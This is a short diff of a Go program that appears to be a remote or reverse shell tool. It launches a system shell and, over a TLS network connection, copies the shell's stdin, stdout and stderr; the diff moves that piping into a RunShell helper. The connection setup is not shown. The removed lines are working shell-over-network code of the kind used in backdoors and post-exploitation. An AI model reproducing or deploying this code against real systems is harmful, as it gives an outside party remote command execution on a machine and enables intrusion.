@@ -3,11 +3,8 @@ package main
 import (
 	"fmt"
 	"crypto/tls"
-//	"log"
-//	"net"
 	"os"
 	"os/exec"
-	"io"
 )
 
 func exists(path string) bool {
@@ -36,44 +33,5 @@ func main() {
 
 	var cmd *exec.Cmd
 	cmd = exec.Command(shellPath)
-
-	stdin, _ := cmd.StdinPipe()
-	stdout, _ := cmd.StdoutPipe()
-	stderr, _ := cmd.StderrPipe()
-	
-	cmd.Start()
-	
-	go func() {
-		io.Copy(stdin, conn)
-		/*buf := make([]byte, 1024)
-		for {
-			n, err := conn.Read(buf)
-			if err != nil {
-				break
-			}
-			stdin.Write(buf[:n])
-		}*/
-	}()
-	
-	go func() {
-		io.Copy(conn, stdout)
-		/*buf := make([]byte, 1024)
-		for {
-			n, err := stdout.Read(buf)
-			if err != nil {
-				break
-			}
-			conn.Write(buf[:n])
-		}*/
-	}()
-	
-	io.Copy(conn, stderr)
-	/*buf := make([]byte, 1024)
-	for {
-		n, err := stderr.Read(buf)
-		if err != nil {
-			break
-		}
-		conn.Write(buf[:n])
-	}*/
+    RunShell(conn, cmd)
 }
